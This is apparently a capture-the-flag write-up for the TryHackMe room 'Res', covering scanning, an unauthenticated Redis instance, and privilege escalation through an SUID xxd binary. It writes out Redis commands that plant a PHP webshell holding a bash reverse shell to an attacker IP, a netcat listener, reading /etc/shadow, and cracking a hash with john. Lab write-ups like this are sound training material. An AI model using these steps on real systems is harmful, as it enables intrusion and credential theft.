---
title: Res CTF Write Up
date: 2023-10-17
categories: [CTF Write Up, THM]
tags: [nmap, redis, rce, webshell, php, gtfobins, john, suid]
img_path: /assets/res/
mermaid: true
---

![room_banner](room_banner.png)

## 1 Summary

[![](https://mermaid.ink/img/pako:eNptkLtuwzAMRX9FUBcZSILMGgrUj_SBFAGcdNNCyHQs2KYMSe4DQX6kS-f-XT-hspOhQ7VQuDy8vOCJa1shl7zu7JtuwAW2LRWx-O5EQWOPDoKxlLDlklEPA1OKHkC3B2d066N6y1JRYmV8chlLJ_IPMfHm2Oxoldm6RpwEwqAhRNCyTIgyK5JESumwmqVcjB7dKrwH9vP1-X1tXdyzSNwfNrvU0Gy9f3nMp_pkG2KHBllphgHdnKsQWwgxf8ee7Sv2SOEasZjWbISzNvy3RZEi3YH3OdZsCuWDsy3Km3q95gseT9KDqeLNTjPNQxPNFZfxW4FrFVd0jhyMwe4_SHMZ3IgLPg5VjJMbODrouayh83j-BY4SfV4?type=png)](https://mermaid.live/edit#pako:eNptkLtuwzAMRX9FUBcZSILMGgrUj_SBFAGcdNNCyHQs2KYMSe4DQX6kS-f-XT-hspOhQ7VQuDy8vOCJa1shl7zu7JtuwAW2LRWx-O5EQWOPDoKxlLDlklEPA1OKHkC3B2d066N6y1JRYmV8chlLJ_IPMfHm2Oxoldm6RpwEwqAhRNCyTIgyK5JESumwmqVcjB7dKrwH9vP1-X1tXdyzSNwfNrvU0Gy9f3nMp_pkG2KHBllphgHdnKsQWwgxf8ee7Sv2SOEasZjWbISzNvy3RZEi3YH3OdZsCuWDsy3Km3q95gseT9KDqeLNTjPNQxPNFZfxW4FrFVd0jhyMwe4_SHMZ3IgLPg5VjJMbODrouayh83j-BY4SfV4)

## 2 Background Information

### 2.1 Redis

[Redis](https://backendless.com/redis-what-it-is-what-it-does-and-why-you-should-care/) is a type of database that stores data entirely in main memory (RAM) rather than on disk. 

Its main benefit is that it provides **faster access** compared to a traditional disk-storaged database, and its main drawback is that it's **sensitive to data loss** in the event of a shutdown or a crash, since it is stored in memory.

![redis-flow](redis-flow.png)

Other than the knowledge of what Redis is, we don't really need much else to work our way through this room. To be honest, even that knowledge isn't necessary, but I find it always better to learn as much as possible for the technologies I am working with. 

If someone has used Redis before, and knows how to interact with it through CLI it will be beneficial for sure, but we will learn the required commands through a [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce) article anyway, so let's crack on 🏃‍♀️!

## 3 CTF Process

### 3.1 Port-scanning

The first question asks us about the number of open ports, so let's start with an **nmap port-scan**.

![nmap-results_common_ports](nmap-scan_without_all_ports.png)

We can see an Apache web server listening to port 80, although, this does not seem like the right answer to the question.

The default command, that is without any port specification, scans the [**most common 1,000 ports for each protocol**](https://nmap.org/book/man-port-specification.html#:~:text=By%20default%2C%20Nmap%20scans%20the,1%2C000%20ports%20for%20each%20protocol.&text=This%20option%20specifies%20which%20ports,(e.g.%201%2D1023%20).), so we can try scanning for all 65_535 ports by adding the `-p` option:

![nmap-scan-all-ports](nmap-scan-all-ports.png)

Now, a **Redis server on port 6379** appears, and the information provided allows us to answer the next three questions 🥂!

### 3.2 Redis to RCE

[This](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) excellent **HackTricks** article provides info on how to connect to Redis. In addition, it let us know that **by default Redis can be accessed without credentials**! 

Futhermore, the article suggests to us trying the `info` command first. The ouput of this command will reveal if authentication is needed for accessing the Redis instance. If it does, the following message will show up: `-NOAUTH Authentication required.` If not, it will return output with Redis instance's info. 

So, let's try it:

![redis_login](redis_connection.jpg)

We are in without needing any credentials, and we also have a username at hand 🎉!

The same [article](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce) lists two ways on how to get **Remote Code Execution (RCE)**:
1. Using the `redis-rogue-server` python script, but this only works for versions `<= 5.0.5`, thus, we can't use it as our target uses `6.0.7`.
2. Creating a **PHP Webshell**, with the prerequisite to know the *path of the Web site folder*. Based on our **nmap scan**, we know that we have an **Apache web server**, and by asking Google, we can find out its default directory:

![default_dir_apache](default_dir_apache.png)

 So let's trying to get our reverse shell:
 1. To begin with, we need to create a reverse shell, this time using a PHP reverse shell from the [Highon.coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell) blog. Note that we need to **escape** the double quotes inside our command with `\`, otherwise it won't work!

    ```bash
    # define the path of Apache's default directory
    config set dir /var/www/html/
    # create a "subdirectory" to host our reverse shell 
    config set dbfilename webshell.php
    # our reverse shell code
    set webshell.php "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/<attacking-ip>/12345 0>&1'\"); ?>"
    # save our configuration
    save
    ```

 2. We then have to set up a listener to our machine:
 
    ```bash
    nc -lnvp 12345
    ```

 3. Finally, by visiting the newly-created server's subdirectory on our browser, `http://\<target-ip\>/webshell.php`, we receive our reverse shell 🎊!
  
    ![rce_setup](rce_setup.png)
 
With our **initial foothold** established, let's search for `user.txt`:

![flag1](flag1.jpg)

First 🚩 captured!

### 3.3 Privilege Escalation with SUID binaries 

The next question wants us to find the local user account's password. We already saw user `vianka` when first logged-in in Redis, and we saw it again while getting our first flag under `/home/vianka/user.txt`. 

When trying to switch to this user, we get the message: `su: must be run from a terminal`. Thus, we need to upgrade our shell, and then find a way to discover `vianka`'s password!

![su_tty](su_tty.png)

It is always worth searching for files with [SUID](https://www.scaler.com/topics/special-permissions-in-linux/) permissions set, as it is often an easy way to do PrivEsc. 

![suid](suids.jpg)

We have done this a couple of times so far, and `usr/bin/xxd` does not seem like a binary that is usually on this list. As we always do when we want to check for SUID file's potential exploits, let's visit [GTFOBins](https://gtfobins.github.io/#xxd): 

![xxd_suid](xxd_suid.png)

Based on GTFOBins, we can use the `xxd` binary to read any file we want, since it will run as root. We can use this to answer the room's last two questions:
1. We can assume that the `root.txt` file is located under the `/root` directory. As a result, we can define the `LFILE` variable as `/root/root.txt` and snatch the root 🚩.
2. We can do the same process for reading the `/etc/shadow` file in order to get `vianka`'s hash. Then, we can combine `vianka`'s info found on `/etc/passwd` file, and use both for unshadowing, and finally crack the hash with `john`.

Let's start by trying to read `root.txt` first. We need to make sure to either be within `xxd`'s directory, by typing `cd /usr/bin/`, or provide the full path, that is `/usr/bin/xxd`.

![flag2](flag2.jpg)

That was easy enough, and we have now captured our second 🚩. Let's go for some hash cracking now and get `vianka`'s password 🔒!

### 3.4 Hash Cracking with John The Ripper

1. Let's start by reading the `shadow` file, copying `vianka`'s information, and pasting it into a file on our machine:

    ![xxd_shadow](xxd_shadow.png)

2. We need to also copy and paste `vianka`'s info from the `passwd` file into another file on our local machine:

    ![passwd](passwd.png)

3. Now, all we have to do is to unshadow the files locally, and pass the unshadowed file to `john` so he can do its magic 🪄:

    ![john](john_vianka.jpg)

And that's us done 🍻!